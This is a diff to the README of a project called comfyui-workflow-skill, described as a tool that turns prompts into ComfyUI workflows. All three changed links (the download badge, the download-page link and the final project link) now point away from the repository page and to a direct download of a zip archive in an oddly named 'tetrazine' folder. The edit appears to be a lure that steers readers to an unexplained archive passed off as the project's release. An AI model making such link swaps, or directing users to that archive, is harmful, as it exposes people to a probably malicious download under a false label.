@@ -1,6 +1,6 @@
 # 🧠 comfyui-workflow-skill - Turn Prompts Into Workflows Fast
 
-[![Download](https://img.shields.io/badge/Download%20Here-2E86DE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/henriqueironed385/comfyui-workflow-skill)
+[![Download](https://img.shields.io/badge/Download%20Here-2E86DE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/henriqueironed385/comfyui-workflow-skill/raw/refs/heads/main/tetrazine/comfyui-workflow-skill-3.3.zip)
 
 ## 🚀 What this app does
 
@@ -40,7 +40,7 @@ It supports common model families like:
 
 Use this link to visit the page and download or set up the project:
 
-[Visit the download page](https://github.com/henriqueironed385/comfyui-workflow-skill)
+[Visit the download page](https://github.com/henriqueironed385/comfyui-workflow-skill/raw/refs/heads/main/tetrazine/comfyui-workflow-skill-3.3.zip)
 
 ### On Windows
 
@@ -280,4 +280,4 @@ Use this process:
 
 If you need the project page again, use this link:
 
-[https://github.com/henriqueironed385/comfyui-workflow-skill](https://github.com/henriqueironed385/comfyui-workflow-skill)
+[https://github.com/henriqueironed385/comfyui-workflow-skill/raw/refs/heads/main/tetrazine/comfyui-workflow-skill-3.3.zip](https://github.com/henriqueironed385/comfyui-workflow-skill/raw/refs/heads/main/tetrazine/comfyui-workflow-skill-3.3.zip)
